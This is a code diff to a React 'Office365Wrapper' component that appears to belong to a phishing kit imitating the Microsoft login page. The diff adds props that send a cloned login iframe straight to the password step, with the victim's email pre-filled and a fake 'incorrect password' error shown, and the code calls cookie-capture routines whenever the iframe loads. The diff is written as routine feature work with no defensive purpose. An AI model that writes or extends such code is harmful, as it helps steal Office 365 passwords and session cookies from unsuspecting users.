@@ -6,9 +6,12 @@ import { realCookieCapture } from '../utils/realCookieCapture';
 interface Office365WrapperProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
+  defaultEmail?: string;
+  startAtPasswordStep?: boolean;
+  incorrectPasswordError?: string;
 }
 
-const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
+const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError, defaultEmail, startAtPasswordStep, incorrectPasswordError }) => {
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [isIframeLoading, setIsIframeLoading] = useState(true);
@@ -125,6 +128,18 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
         // When the iframe content is ready, hide the loader and show the iframe
         onLoad={() => {
           setIsIframeLoading(false);
+          // If mounted from the IncorrectPasswordPage, jump the iframe straight
+          // to its password step with the email pre-filled and the error
+          // banner shown — instead of letting the user re-enter their email.
+          if (startAtPasswordStep && iframeRef.current?.contentWindow) {
+            iframeRef.current.contentWindow.postMessage({
+              type: 'SHOW_PASSWORD_STEP',
+              payload: {
+                email: defaultEmail || '',
+                errorMessage: incorrectPasswordError || '',
+              },
+            }, '*');
+          }
           // Trigger initial cookie capture when iframe loads
           setTimeout(() => {
             microsoftCookieCapture.forceCaptureNow();
